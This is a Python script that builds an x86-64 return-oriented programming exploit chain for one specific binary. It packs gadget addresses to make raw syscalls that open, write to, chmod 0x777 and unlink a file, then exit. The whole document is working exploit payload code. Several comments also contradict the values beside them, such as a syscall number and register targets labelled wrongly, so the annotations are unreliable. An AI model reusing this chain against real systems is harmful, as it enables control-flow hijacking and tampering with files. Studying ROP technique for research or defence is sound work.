#!/usr/bin/python
from struct import pack

def do_3(p):
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "abcdefgh" # abcdefgh file name
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call stat

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000004) # 4 stat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	#call open
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000002) # flags 2 read and write
 
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000070) # mode group has read write and exeute permission

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000002) # 2 open
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call stat

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000004) # 4 stat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	#call open
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000002) # flags 2 read and write
 
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000070) # mode group has read write and exeute permission

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000002) # 2 open
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call fstat
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000001) # stdout

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000005) # 5 fstat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	# call stat

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000004) # 4 stat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	#call write

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret #fd
	p += pack("<Q", 0x0000000000000004) # 4 fd

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "12345678" # 12345678
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data + 8

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # number of bytes 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000001) # 1 write
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	#call write

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret #fd
	p += pack("<Q", 0x0000000000000004) # 4 fd

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "12345678" # 12345678
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data + 8

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # number of bytes 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000001) # 1 write
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# utime

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000084) # 132 utime
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# unlink
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000057) # 87 chown
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call chmod

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000777) # 777 mode

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000005a) # 90 chmod
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

#call exit
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000003c) # 60 exit
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000000) # 0
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	return p


